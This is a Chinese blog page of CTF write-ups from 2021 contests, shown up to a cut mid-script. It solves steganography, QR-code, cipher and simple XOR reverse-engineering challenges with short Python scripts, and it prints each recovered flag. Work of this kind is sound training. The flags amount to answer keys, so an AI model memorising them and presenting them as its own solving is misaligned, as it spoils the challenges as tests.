<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021年各比赛wp | M4XLMUM</title><meta name="keywords" content="ctf"><meta name="author" content="M4XLMUM"><meta name="copyright" content="M4XLMUM"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言水平有限，大家包涵因为本人的时间与水平很有限(简言之就是菜得一批)，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。 记录内容记录了2021年各个比赛所做出题的wp，可能还会有复现的题目的wp。 DozerCTFMISC不会有人以为re那道才是签到吧解题过程 在视频中发现flag flagDozerCTF&amp;#123;w3lc0me">
<meta property="og:type" content="article">
<meta property="og:title" content="2021年各比赛wp">
<meta property="og:url" content="https://m4xlmum.github.io/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/index.html">
<meta property="og:site_name" content="M4XLMUM">
<meta property="og:description" content="前言水平有限，大家包涵因为本人的时间与水平很有限(简言之就是菜得一批)，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。 记录内容记录了2021年各个比赛所做出题的wp，可能还会有复现的题目的wp。 DozerCTFMISC不会有人以为re那道才是签到吧解题过程 在视频中发现flag flagDozerCTF&amp;#123;w3lc0me">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://m4xlmum.github.io/img/topimg/image-20210530011121777.png">
<meta property="article:published_time" content="2021-05-29T01:52:06.000Z">
<meta property="article:modified_time" content="2021-09-11T15:36:00.000Z">
<meta property="article:author" content="M4XLMUM">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://m4xlmum.github.io/img/topimg/image-20210530011121777.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://m4xlmum.github.io/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu_site_verification" content="Erg2Bytt6M"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-9257596953357662',
  enable_page_level_ads: 'true'
});</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: M4XLMUM","link":"链接: ","source":"来源: M4XLMUM","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-09-11 23:36:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/topimg/image-20210530011121777.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M4XLMUM</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2021年各比赛wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-29T01:52:06.000Z" title="发表于 2021-05-29 09:52:06">2021-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-11T15:36:00.000Z" title="更新于 2021-09-11 23:36:00">2021-09-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">19.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>107分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2021年各比赛wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="水平有限，大家包涵"><a href="#水平有限，大家包涵" class="headerlink" title="水平有限，大家包涵"></a>水平有限，大家包涵</h2><p>因为本人的时间与水平很有限(简言之就是菜得一批)，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。</p>
<h2 id="记录内容"><a href="#记录内容" class="headerlink" title="记录内容"></a>记录内容</h2><p>记录了2021年各个比赛所做出题的wp，可能还会有复现的题目的wp。</p>
<h1 id="DozerCTF"><a href="#DozerCTF" class="headerlink" title="DozerCTF"></a>DozerCTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529192924991.png" alt="image-20210529192924991"></p>
<p>在视频中发现flag</p>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">DozerCTF&#123;w3lc0me_to_Do2erCTF&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><h4 id="用到的在线网站"><a href="#用到的在线网站" class="headerlink" title="用到的在线网站"></a>用到的在线网站</h4><p><a target="_blank" rel="noopener" href="https://it365.gitlab.io/zh-cn/gif-frames/?zlan">在线动图分帧工具</a></p>
<p><a target="_blank" rel="noopener" href="http://cdn.malu.me/qrdecode/">在线二维码扫描工具</a></p>
<h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>可以发现图片里面藏着两个图片文件，一个GIF文件，另一个是一个没用的PNG文件。用上面的在线分帧软件将图片一帧一帧地分开。得到的二维码再一张一张地扫得下面的内容(因为二维码也不是特别多，没必要再写个脚本搞)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 得到的内容是zoDCre&#123;FT_si_timiselp</span>


s <span class="token operator">=</span> <span class="token string">'zoDCre&#123;FT_si_timiselp'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># DozerCTF&#123;is_it_simple</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以感觉后面还是有东西的，估计东西就是在后面我以为没用的那个png文件中了。再扫描以下后面的二维码发现是一个零宽隐写，在线扫描一下。</p>
<p>得到的内容似乎是<code>我已经看见了，‎‏‏‍‏‍‌‏‍‏‎‏‏‏‌‏‍‌‏‎‍‌‌‎‎‏‏‏‍‌‏‍‏‎‏‍‏‎‏‍‏‎‌‏‎‍‏‌‎‎‏‍‏‎‌‏‌‌你呢？</code>，零宽之后得到的内容是<code>tntentinttteteteee</code>，往下没做动。</p>
<h1 id="DASCTF-X-BUU"><a href="#DASCTF-X-BUU" class="headerlink" title="DASCTF X BUU"></a>DASCTF X BUU</h1><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/banner_1.png" alt="比赛banner"></p>
<h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>DASCTF，由杭州安恒信息网络空间安全学院主办，是面向所有网络安全爱好者举办的职业技能大赛，为优秀参赛选手提供相关职业实习机会；为热衷于竞赛的网络安全爱好者提供竞赛平台；为大赛挑选强劲战队，增加决赛获奖难度与竞赛乐趣；为用人单位选拔优质人才。 通过比赛形式，挖掘网络安全人才，提升网络安全建设能力，增强我国网络安全防御能力。 2021年，DASCTF与高校、战队合作，共举办6场竞赛，合作方包括海南大学、贵州大学、榆林学院、浙江农林大学、公大、国内知名CTF联盟BJD、国内知名战队NepNep、国内知名战队天璇Merak、国内知名战队V&amp;N，每场竞赛参与人数均在1500+，赛后调研好评率高达95%以上。</p>
<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_dasctf_may}</p>
<h3 id="Holmes"><a href="#Holmes" class="headerlink" title="Holmes"></a>Holmes</h3><p>一张图片，winhex打开发现后面是rar压缩包文件，然后分离压缩包，图片上跳舞的小人密码解出来压缩包的密钥为<code>YOYARHHOLMES</code>，根据那两个颜色稍显重一点的内容猜测那两位字符可能是需要猜的，所以口令就是<code>YOUAREHOLMES</code></p>
<p>解压出的python文件的内容为</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">"flag&#123;********************************&#125;"</span>
encflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    encflag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
[102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79,
76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34]
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单逆向一下得flag为</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">encflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span>
<span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>encflag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> i<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038</span>
<span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="rickroll-u"><a href="#rickroll-u" class="headerlink" title="rickroll_u"></a>rickroll_u</h3><p>明文攻击得口令为<code>t!m32R1</code></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529110002150.png" alt="明文攻击"></p>
<p>解压之后获得一段wav音频文件。</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="PaperPlease"><a href="#PaperPlease" class="headerlink" title="PaperPlease"></a>PaperPlease</h3><p>题目描述：简单的字符串解密</p>
<p>确实只是一段简单的逆向，给出的变换后的字符串的内容为<code>DASCTF&#123;5c715207e3abed7dfb7c8ea9c82d0e29&#125;</code></p>
<p>主要负责变换字符串的部分的代码的逆向内容为</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">subfhsadkhjbfleiowiuoyfgshjdvbsmnakl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-24h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-20h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>

  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dest<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">unk_sa7ydu3jb432</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的部分再取最重要的变换的部分为</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里的<code>(_BYTE *)unk_6984657</code>应该是一个地址，后面的<code>*()</code>的所有内容为如下的数据</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">.rodata:0000000000002008 unk_2008        db  56h ; V             ; DATA XREF: .data:_unk_6984657↓o
.rodata:0000000000002009                 db    5
.rodata:000000000000200A                 db  53h ; S
.rodata:000000000000200B                 db  52h ; R
.rodata:000000000000200C                 db    4
.rodata:000000000000200D                 db    3
.rodata:000000000000200E                 db  53h ; S
.rodata:000000000000200F                 db  54h ; T
.rodata:0000000000002010                 db    4
.rodata:0000000000002011                 db  0Bh
.rodata:0000000000002012                 db  53h ; S
.rodata:0000000000002013                 db  51h ; Q
.rodata:0000000000002014                 db    6
.rodata:0000000000002015                 db    6
.rodata:0000000000002016                 db  0Fh
.rodata:0000000000002017                 db  55h ; U
.rodata:0000000000002018                 db    5
.rodata:0000000000002019                 db  5Bh ; [
.rodata:000000000000201A                 db    3
.rodata:000000000000201B                 db  56h ; V
.rodata:000000000000201C                 db  0Eh
.rodata:000000000000201D                 db    7
.rodata:000000000000201E                 db  57h ; W
.rodata:000000000000201F                 db  0Eh
.rodata:0000000000002020                 db    1
.rodata:0000000000002021                 db  0Dh
.rodata:0000000000002022                 db  56h ; V
.rodata:0000000000002023                 db    0
.rodata:0000000000002024                 db    4
.rodata:0000000000002025                 db    6
.rodata:0000000000002026                 db  0Ah
.rodata:0000000000002027                 db  5Dh ; ]
.rodata:0000000000002028                 db    0
.rodata:0000000000002029                 db    0
.rodata:000000000000202A unk_202A        db  12h                 ; DATA XREF: init+30↑o
.rodata:000000000000202B                 db  54h ; T
.rodata:000000000000202C                 db  33h ; 3
.rodata:000000000000202D                 db  0Ch
.rodata:000000000000202E                 db  0Ah
.rodata:000000000000202F                 db  1Ah
.rodata:0000000000002030                 db    0
.rodata:0000000000002031                 db    0
.rodata:0000000000002032                 db    0
.rodata:0000000000002033                 db    0
.rodata:0000000000002034                 db    0
.rodata:0000000000002035                 db    0
.rodata:0000000000002036                 db    0
.rodata:0000000000002037                 db    0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单整理一下为下面的内容（我不会写也没有ida的脚本，下面的全靠手工整理）</p>
<pre class="line-numbers language-none"><code class="language-none">key &#x3D; [0x56, 0x5, 0x53, 0x52, 0x4, 0x3, 0x53, 0x54, 0x4, 0x0B, 0x53, 0x51, 0x6, 0x6, 0x0F, 0x55, 0x5, 0x5B, 0x3, 0x56,
       0x0E, 0x7, 0x57, 0x0E, 0x1, 0x0D, 0x56, 0x0, 0x4, 0x6, 0x0A, 0x5D, 0x0, 0x0, 0x12, 0x54, 0x33, 0x0C, 0x0A, 0x1A]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>简单逆向一下得flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ss <span class="token operator">=</span> <span class="token string">'5c715207e3abed7dfb7c8ea9c82d0e29'</span>
s2 <span class="token operator">=</span> <span class="token string">''</span>
